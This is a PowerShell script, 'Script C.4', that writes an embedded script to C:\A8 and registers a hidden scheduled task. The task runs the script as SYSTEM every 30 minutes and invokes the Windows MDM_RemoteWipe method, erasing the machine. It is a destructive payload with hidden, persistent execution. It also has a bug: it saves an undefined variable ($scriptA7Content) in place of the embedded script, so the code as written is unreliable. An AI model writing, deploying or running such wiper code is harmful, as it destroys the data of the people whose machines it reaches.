# Script C.4
# This script writes and deploys script A.8, and creates a scheduled task
# !!WARNING: This script will wipe all data on the deployed computer!!

# Save script A.8 to a file
$scriptA8Content = @'
# Script A.8
# This script triggers a remote wipe on the target system

$namespaceName = "root\cimv2\mdm\dmmap"
$className = "MDM_RemoteWipe"
$methodName = "doWipeMethod"

$session = New-CimSession

$params = New-Object Microsoft.Management.Infrastructure.CimMethodParametersCollection
$param = [Microsoft.Management.Infrastructure.CimMethodParameter]::Create("param", "", "String", "In")
$params.Add($param)

$instance = Get-CimInstance -Namespace $namespaceName -ClassName $className -Filter "ParentID='./Vendor/MSFT' and InstanceID='RemoteWipe'"
$session.InvokeMethod($namespaceName, $instance, $methodName, $params)

'@

New-Item -ItemType Directory -Path "C:\\A8"
$scriptA7Content | Set-Content -Path "C:\\A8\\A.8.ps1" -Force
echo "Script A.8 has been saved to C:\\A8\\A.8.ps1."

$taskName = "ScriptC4Task"
$taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 30)
$taskAction = New-ScheduledTaskAction -Execute "cmd.exe" -Argument '/c start /min "" PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\A8\A.8.ps1'
$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -StartWhenAvailable

echo "Registering scheduled task '$taskName' to run payload script A.8 every 30 minutes."

Register-ScheduledTask -TaskName $taskName -Trigger $taskTrigger -Action $taskAction -Settings $taskSettings -User "SYSTEM" -RunLevel Highest -Force

echo "Enabling Scheduled Task Now."

schtasks /run /tn "ScriptC4Task"

echo "Script C.4 has completed running."
